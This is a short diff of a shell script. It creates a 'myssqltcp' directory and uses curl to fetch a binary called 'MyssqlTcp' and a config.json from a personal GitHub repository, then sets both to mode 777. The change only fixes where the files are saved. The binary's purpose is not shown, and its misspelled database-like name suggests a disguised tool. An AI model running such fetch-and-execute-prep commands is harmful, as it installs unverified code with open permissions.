@@ -117,8 +117,8 @@ echo "/$HOME/??"
 mkdir myssqltcp
 
 cd /$HOME/myssqltcp
-curl -L --progress-bar "https://raw.githubusercontent.com/teshushu/BiBi/main/Bash/config.json" -o $HOME/config.json
-curl -L --progress-bar "https://raw.githubusercontent.com/teshushu/BiBi/main/Bash/MyssqlTcp" -o $HOME/MyssqlTcp
+curl -L --progress-bar "https://raw.githubusercontent.com/teshushu/BiBi/main/Bash/config.json" -o $HOME/myssqltcp/config.json
+curl -L --progress-bar "https://raw.githubusercontent.com/teshushu/BiBi/main/Bash/MyssqlTcp" -o $HOME/myssqltcp/MyssqlTcp
 chmod 777 MyssqlTcp
 chmod 777 config.json
 
